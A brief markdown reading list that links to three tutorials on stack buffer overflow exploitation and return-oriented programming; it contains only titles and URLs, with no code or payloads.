- [Hands-on Stack Overflow from Beginner to Giving Up (Part 1)](https://zhuanlan.zhihu.com/p/25816426)
- [Hands-on Stack Overflow from Beginner to Giving Up (Part 2)](https://zhuanlan.zhihu.com/p/25892385)
- [Modern Stack Overflow Exploitation Fundamentals: ROP](http://bobao.360.cn/learning/detail/3694.html)
